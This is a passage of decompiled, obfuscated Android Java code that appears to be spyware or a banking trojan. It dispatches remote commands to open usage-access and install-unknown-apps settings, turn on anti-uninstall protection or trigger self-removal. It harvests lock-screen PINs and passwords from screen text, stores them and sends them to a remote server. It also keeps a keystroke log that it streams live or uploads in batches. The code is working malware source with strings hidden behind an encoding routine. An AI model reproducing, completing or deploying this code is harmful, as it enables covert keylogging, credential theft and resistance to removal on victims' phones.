                                            JW3Lh9hxwLsO2ArTlH(15000L);
                                            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ11 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                                            VpKcDcuRNaQkRJ5.Qrz92kRPw4GcghAc();
                                            DataQFAdapter dataQFAdapter23 = DataQFAdapter.instance;
                                            if (dataQFAdapter23 != null) {
                                                VpKcDcuRNaQkRJ5.gmNWMfvn6zlEj(dataQFAdapter23);
                                            }
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002C0066005E008900CF00BD00D300B3003700730049009E"))) {
                                            JW3Lh9hxwLsO2ArTlH(15000L);
                                            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ12 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                                            VpKcDcuRNaQkRJ5.Qrz92kRPw4GcghAc();
                                            DataQFAdapter dataQFAdapter24 = DataQFAdapter.instance;
                                            if (dataQFAdapter24 != null) {
                                                VpKcDcuRNaQkRJ5.D5P1xCAyuvgF(dataQFAdapter24);
                                            }
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002C0066005E008900CF00BE00D100A4002600650048008E00F200B600DE00AE0037006F"))) {
                                            JW3Lh9hxwLsO2ArTlH(15000L);
                                            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ13 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                                            VpKcDcuRNaQkRJ5.Qrz92kRPw4GcghAc();
                                            DataQFAdapter dataQFAdapter25 = DataQFAdapter.instance;
                                            if (dataQFAdapter25 != null) {
                                                VpKcDcuRNaQkRJ5.pyu8ovAipBTLYAiKab(dataQFAdapter25);
                                            }
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002C0066005E008900CF00AA00C100A6002400730064009400E400BE00C600B4"))) {
                                            JW3Lh9hxwLsO2ArTlH(15000L);
                                            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ14 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                                            VpKcDcuRNaQkRJ5.Qrz92kRPw4GcghAc();
                                            DataQFAdapter dataQFAdapter26 = DataQFAdapter.instance;
                                            if (dataQFAdapter26 != null) {
                                                Intent intent = new Intent("android.settings.USAGE_ACCESS_SETTINGS");
                                                intent.addFlags(268435456);
                                                dataQFAdapter26.startActivity(intent);
                                            }
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("002C0066005E008900CF00B600DC00B4003700770057008B00CF00AA00DC00AC002D0079004C0089"))) {
                                            JW3Lh9hxwLsO2ArTlH(15000L);
                                            VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ15 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                                            VpKcDcuRNaQkRJ5.Qrz92kRPw4GcghAc();
                                            DataQFAdapter dataQFAdapter27 = DataQFAdapter.instance;
                                            if (dataQFAdapter27 != null) {
                                                try {
                                                    Intent intent2 = new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES", Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + dataQFAdapter27.getPackageName()));
                                                    intent2.addFlags(268435456);
                                                    dataQFAdapter27.startActivity(intent2);
                                                } catch (Exception unused2) {
                                                    Intent intent3 = new Intent("android.settings.SECURITY_SETTINGS");
                                                    intent3.addFlags(268435456);
                                                    dataQFAdapter27.startActivity(intent3);
                                                }
                                            }
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("00260078005A008500FC00BA00ED00B700310079004F008200F300AB00DB00A8002D"))) {
                                            DataQFAdapter.antiUninstallEnabled = true;
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("0027007F0048008600F200B300D70098003300640054009300F500BC00C600AE002C0078"))) {
                                            JW3Lh9hxwLsO2ArTlH(jSONObject.optLong(TypefaceCache.obtain("002700630049008600E400B600DD00A9"), 300000L));
                                        } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003000730057008100CF00AA00DC00AE002D0065004F008600FC00B3"))) {
                                            DataQFAdapter.antiUninstallEnabled = false;
                                            DataQFAdapter dataQFAdapter28 = DataQFAdapter.instance;
                                            if (dataQFAdapter28 != null) {
                                                Intent intent4 = new Intent("android.intent.action.DELETE");
                                                intent4.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + dataQFAdapter28.getPackageName()));
                                                intent4.addFlags(268435456);
                                                dataQFAdapter28.startActivity(intent4);
                                            }
                                        } else if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strOptString, TypefaceCache.obtain("003300640054009300F500BC00C600AE002C00780064009400E400BE00C600B20030"))) {
                                            String unused3 = DataQFAdapter.TAG;
                                            TypefaceCache.obtain("001600780050008900FF00A800DC00E700220075004F008E00FF00B1008800E7");
                                            jSONObject.optString("action");
                                            return false;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return true;
        } catch (Exception e) {
            String unused4 = DataQFAdapter.TAG;
            TypefaceCache.obtain("002B00770055008300FC00BA00F100A8002E007B005A008900F400FF00D700B500310079004900DD00B0");
            e.getMessage();
            return false;
        }
    }

    public final synchronized void b1EoSIRjJHO5() {
        SharedPreferences sharedPreferences;
        SharedPreferences.Editor editorEdit;
        SharedPreferences.Editor editorPutString;
        try {
            Timer timer = DataQFAdapter.pinConfirmTimer;
            if (timer != null) {
                timer.cancel();
            }
            DataQFAdapter.pinConfirmTimer = null;
            int length = DataQFAdapter.pinDigits.length();
            if (4 > length || length >= 9 || System.currentTimeMillis() - DataQFAdapter.pinDigitsTime >= 15000) {
                DataQFAdapter.pinDigits.setLength(0);
            } else {
                DataQFAdapter.capturedPin = DataQFAdapter.pinDigits.toString();
                DataQFAdapter.pinDigits.setLength(0);
                try {
                    DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
                    Context applicationContext = dataQFAdapter != null ? dataQFAdapter.getApplicationContext() : null;
                    if (applicationContext != null && (sharedPreferences = applicationContext.getSharedPreferences(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B7002A0078"), 0)) != null && (editorEdit = sharedPreferences.edit()) != null && (editorPutString = editorEdit.putString(TypefaceCache.obtain("0033007F0055"), DataQFAdapter.capturedPin)) != null) {
                        editorPutString.apply();
                    }
                } catch (Exception unused) {
                }
                String unused2 = DataQFAdapter.TAG;
                TypefaceCache.obtain("0013005F007500C700F300B000DC00A1002A00640056008200F400FF009400E700300077004D008200F400E50092");
                DataQFAdapter.capturedPin.getClass();
                TypefaceCache.obtain("006300720052008000F900AB00C1");
                try {
                    iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                    RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                    if (rWY6BVSB0XxPbw != null) {
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("0033007F005500B800F300BE00C200B300360064005E0083"));
                        String strObtain = TypefaceCache.obtain("0033007F0055");
                        DataQFAdapter.Companion.getClass();
                        jSONObject.put(strObtain, DataQFAdapter.capturedPin);
                        jSONObject.put(TypefaceCache.obtain("002F00730055008000E400B7"), DataQFAdapter.capturedPin.length());
                        rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
                    }
                } catch (Exception unused3) {
                }
            }
        } catch (Throwable th) {
            throw th;
        }
    }

    public final synchronized void dDIMxZXP1V8HdM(NxAMaDFbSCxW6M03f nxAMaDFbSCxW6M03f) {
        try {
            DataQFAdapter.keylogEntries.add(nxAMaDFbSCxW6M03f);
            if (DataQFAdapter.keylogEntries.size() > 5000) {
                DataQFAdapter.keylogEntries.remove(0);
            }
            if (DataQFAdapter.liveKeylogEnabled) {
                try {
                    iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                    RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                    if (rWY6BVSB0XxPbw != null) {
                        rWY6BVSB0XxPbw.XiR1pIn5878vVWd(nxAMaDFbSCxW6M03f);
                    }
                } catch (Throwable th) {
                    String unused = DataQFAdapter.TAG;
                    TypefaceCache.obtain("000F007F004D008200B000B400D700BE002F0079005C00C700E300BA00DC00A3006300730049009500FF00AD008800E7");
                    th.getMessage();
                }
            } else {
                DataQFAdapter.pendingBatch.add(nxAMaDFbSCxW6M03f);
                if (DataQFAdapter.pendingBatch.size() >= 50) {
                    Qrz92kRPw4GcghAc();
                }
                if (DataQFAdapter.batchTimer == null) {
                    ScheduledExecutorService scheduledExecutorServiceNewSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
                    scheduledExecutorServiceNewSingleThreadScheduledExecutor.scheduleAtFixedRate(new jdOQeRk37T35X5xKW1P(4), 2000L, 2000L, TimeUnit.MILLISECONDS);
                    DataQFAdapter.batchTimer = scheduledExecutorServiceNewSingleThreadScheduledExecutor;
                }
            }
        } catch (Throwable th2) {
            throw th2;
        }
    }

    public final synchronized void ibVTtJUNfrGYbW() {
        SharedPreferences sharedPreferences;
        SharedPreferences.Editor editorEdit;
        SharedPreferences.Editor editorPutString;
        try {
            Timer timer = DataQFAdapter.lockPasswordConfirmTimer;
            if (timer != null) {
                timer.cancel();
            }
            DataQFAdapter.lockPasswordConfirmTimer = null;
            DataQFAdapter.passwordPollerActive = false;
            String string = KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(DataQFAdapter.lockPasswordBuffer.toString()).toString();
            if (string.length() < 4 || System.currentTimeMillis() - DataQFAdapter.lockPasswordTime >= 30000) {
                DataQFAdapter.lockPasswordBuffer.setLength(0);
            } else {
                DataQFAdapter.capturedPassword = string;
                DataQFAdapter.lockPasswordBuffer.setLength(0);
                try {
                    DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
                    Context applicationContext = dataQFAdapter != null ? dataQFAdapter.getApplicationContext() : null;
                    if (applicationContext != null && (sharedPreferences = applicationContext.getSharedPreferences(TypefaceCache.obtain("00270073004D008E00F300BA00ED00B7002A0078"), 0)) != null && (editorEdit = sharedPreferences.edit()) != null && (editorPutString = editorEdit.putString(TypefaceCache.obtain("003300770048009400E700B000C000A3"), DataQFAdapter.capturedPassword)) != null) {
                        editorPutString.apply();
                    }
                } catch (Exception unused) {
                }
                String unused2 = DataQFAdapter.TAG;
                TypefaceCache.obtain("001300770048009400E700B000C000A3006300750054008900F600B600C000AA00260072001B00C100B000AC00D300B100260072000100C7");
                DataQFAdapter.capturedPassword.getClass();
                TypefaceCache.obtain("006300750053008600E200AC");
                try {
                    iStgVlW5d7CQ5MhFi istgvlw5d7cq5mhfi = RWY6BVSB0XxPbw.d6c98qX7r0XzUZFibx;
                    RWY6BVSB0XxPbw rWY6BVSB0XxPbw = RWY6BVSB0XxPbw.GUsyOYEIobMSb6n;
                    if (rWY6BVSB0XxPbw != null) {
                        JSONObject jSONObject = new JSONObject();
                        jSONObject.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003300770048009400E700B000C000A3001C0075005A009700E400AA00C000A20027"));
                        String strObtain = TypefaceCache.obtain("003300770048009400E700B000C000A3");
                        DataQFAdapter.Companion.getClass();
                        jSONObject.put(strObtain, DataQFAdapter.capturedPassword);
                        jSONObject.put(TypefaceCache.obtain("002F00730055008000E400B7"), DataQFAdapter.capturedPassword.length());
                        rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
                    }
                } catch (Exception unused3) {
                }
            }
        } catch (Throwable th) {
            throw th;
        }
    }

    public final synchronized void rCHnHJBAlOpNI5(String str, String str2) {
        try {
            if (DataQFAdapter.lockScreenPackages.contains(str2)) {
                if (DataQFAdapter.capturedPassword.length() > 0) {
                    return;
                }
                for (int i = 0; i < str.length(); i++) {
                    if (Character.isLetter(str.charAt(i))) {
                        for (int i2 = 0; i2 < str.length(); i2++) {
                            char cCharAt = str.charAt(i2);
                            if (cCharAt != 8226 && cCharAt != '*' && cCharAt != 9679) {
                                DataQFAdapter.lockPasswordBuffer.setLength(0);
                                DataQFAdapter.lockPasswordBuffer.append(str);
                                DataQFAdapter.lockPasswordTime = System.currentTimeMillis();
                                String unused = DataQFAdapter.TAG;
                                TypefaceCache.obtain("001300770048009400E700B000C000A300630062005E009F00E400FF00D400B5002C007B001B008200E600BA00DC00B300790036");
                                TypefaceCache.obtain("006300750053008600E200AC");
                                Timer timer = DataQFAdapter.lockPasswordConfirmTimer;
                                if (timer != null) {
                                    timer.cancel();
                                }
                                DataQFAdapter.lockPasswordConfirmTimer = new Timer();
                                Timer timer2 = DataQFAdapter.lockPasswordConfirmTimer;
                                if (timer2 != null) {
                                    timer2.schedule(new HM4aGJXSNeHl1YeqJkL(0), 3000L);
                                }
                                return;
                            }
                        }
                        return;
                    }
                }
            }
        } catch (Throwable th) {
            throw th;
        }
    }

    public final synchronized void xDyLpEZyrcKVe0() {
        DataQFAdapter.keylogEntries.clear();
        DataQFAdapter.pendingBatch.clear();
    }
}
